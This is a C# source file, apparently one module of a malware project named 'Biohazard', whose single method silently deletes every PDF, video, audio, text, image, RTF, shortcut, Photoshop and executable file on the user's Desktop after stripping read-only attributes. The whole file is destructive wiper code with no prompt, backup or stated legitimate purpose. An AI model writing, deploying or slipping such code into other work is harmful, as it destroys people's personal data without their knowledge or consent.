using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Biohazard.DesktopDeleteFiles
{
    class BiohazardDeleteFilesDesktop
    {
        public void DeleteFilesDesktop()
        {
            string desk = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            DirectoryInfo pdffiledelete = new DirectoryInfo(desk);
            FileInfo[] pdffile = pdffiledelete.GetFiles("*.pdf");
            foreach (FileInfo pdfdelete in pdffile)
            {
                pdfdelete.Attributes = FileAttributes.Normal;
                pdfdelete.Delete();
            }
            DirectoryInfo mp4formatfile = new DirectoryInfo(desk);
            FileInfo[] mp4del = mp4formatfile.GetFiles("*.mp4");
            foreach (FileInfo mmp4delete in mp4del)
            {
                mmp4delete.Attributes = FileAttributes.Normal;
                mmp4delete.Delete();
            }
            DirectoryInfo wavfile = new DirectoryInfo(desk);
            FileInfo[] wavv = wavfile.GetFiles("*.wav");
            foreach (FileInfo file in wavv)
            {
                file.Attributes = FileAttributes.Normal;
                file.Delete();
            }
            DirectoryInfo textfiles = new DirectoryInfo(desk);
            FileInfo[] gettextfiles = textfiles.GetFiles("*.txt");
            foreach (FileInfo txt in gettextfiles)
            {
                txt.Attributes = FileAttributes.Normal;
                txt.Delete();
            }
            DirectoryInfo jpegformat = new DirectoryInfo(desk);
            FileInfo[] fileJPEG = jpegformat.GetFiles("*.jpg");
            foreach (FileInfo jpgfile in fileJPEG)
            {
                jpgfile.Attributes = FileAttributes.Normal;
                jpgfile.Delete();
            }
            DirectoryInfo pngfile = new DirectoryInfo(desk);
            FileInfo[] filePNGinfo = pngfile.GetFiles("*.png");
            foreach (FileInfo png123 in filePNGinfo)
            {
                png123.Attributes = FileAttributes.Normal;
                png123.Delete();
            }
            DirectoryInfo rtf = new DirectoryInfo(desk);
            if (rtf.Exists)
            {
                FileInfo[] fileRTF = rtf.GetFiles("*.rtf");
                foreach (FileInfo rtf123 in fileRTF)
                {
                    rtf123.Attributes = FileAttributes.Normal;
                    rtf123.Delete();
                }
            }
            DirectoryInfo linkfolder = new DirectoryInfo(desk);
            FileInfo[] lnkfold = linkfolder.GetFiles("*.lnk");
            foreach (FileInfo lnk in lnkfold)
            {
                lnk.Attributes = FileAttributes.Normal;
                lnk.Delete();
            }
            DirectoryInfo photoshop = new DirectoryInfo(desk);
            FileInfo[] phot = photoshop.GetFiles("*.psd");
            foreach (FileInfo psd in phot)
            {
                psd.Attributes = FileAttributes.Normal;
                psd.Delete();
            }
            DirectoryInfo xexe = new DirectoryInfo(desk);
            FileInfo[] exe = xexe.GetFiles("*.exe");
            foreach(FileInfo info in exe)
            {
                info.Attributes = FileAttributes.Normal;
                info.Delete();
            }
        }
    }
}
